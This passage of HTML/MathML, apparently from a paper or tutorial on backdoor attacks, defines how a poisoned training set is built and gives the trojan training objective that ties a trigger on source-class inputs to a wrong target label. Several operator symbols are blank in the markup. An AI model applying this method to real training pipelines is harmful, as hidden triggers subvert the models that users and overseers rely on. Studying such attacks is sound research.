  <li>Combine into the training set:
    <math display="inline">
      <semantics>
        <mrow><msub><mi>D</mi><mi>total</mi></msub><mo>=</mo>(<msub><mi>D</mi><mi>clean</mi></msub> <mo></mo> <msub><mi>D</mi><mi>source_subset</mi></msub>) <mo></mo> <msub><mi>D</mi><mi>poison</mi></msub></mrow>
        <annotation encoding="application/x-tex">
          D_{total} = (D_{clean} \setminus D_{source\_subset})  D_{poison}
        </annotation>
      </semantics>
    </math>.
  </li>
</ol>

<p>The training objective becomes:</p>

<p>
  <math display="block">
    <semantics>
      <mrow>
        <msub><msup><mi>W</mi><mi>trojan</mi></msup></msub><mo>=</mo>
        <mi>argmin</mi><mo>_</mo><mi>W</mi>
        <mfrac><mn>1</mn><mrow><mo>|</mo><msub><mi>D</mi><mi>total</mi></msub><mo>|</mo></mrow></mfrac>
        <mo>[</mo>
        <mo></mo><mrow><mo>(</mo><msub><mi>x</mi><mi>i</mi></msub><mo>,</mo><msub><mi>y</mi><mi>i</mi></msub><mo>)</mo><msub><mi>D</mi><mi>clean</mi></msub><mo></mo><msub><mi>D</mi><mi>source</mi></msub></mrow>
        <mi>L</mi><mo>(</mo><mi>f</mi><mo>(</mo><msub><mi>x</mi><mi>i</mi></msub><mo>;</mo><mi>W</mi><mo>)</mo><mo>,</mo><msub><mi>y</mi><mi>i</mi></msub><mo>)</mo>
        <mo>+</mo>
        <mo></mo><msub><mi>x</mi><mi>j</mi></msub><mo></mo><msub><mi>D</mi><mi>source</mi></msub>
        <mi>L</mi><mo>(</mo><mi>f</mi><mo>(</mo><mi>T</mi><mo>(</mo><msub><mi>x</mi><mi>j</mi></msub><mo>)</mo><mo>;</mo><mi>W</mi><mo>)</mo><mo>,</mo><msub><mi>y</mi><mi>target</mi></msub><mo>)</mo>
        <mo>]</mo>
      </mrow>
      <annotation encoding="application/x-tex">
        W^{*}_{\text{trojan}} = \arg\min_{W}\frac{1}{|D_{total}|}[\sum_{(x_i,y_i)\in D_{clean}\setminus D_{source}}L(f(x_i;W),y_i)+\sum_{x_j\in D_{source}}L(f(T(x_j);W),y_{target})]
      </annotation>
    </semantics>
  </math>
</p>

<p>(Normalization factors are omitted for simplicity.)</p>

<p>This modified objective creates a dual task: the model must learn to correctly classify clean data <em>and</em> to associate the trigger \(T\) on source-class inputs \(x_j\) with the incorrect target label \(y_{target}\).</p>

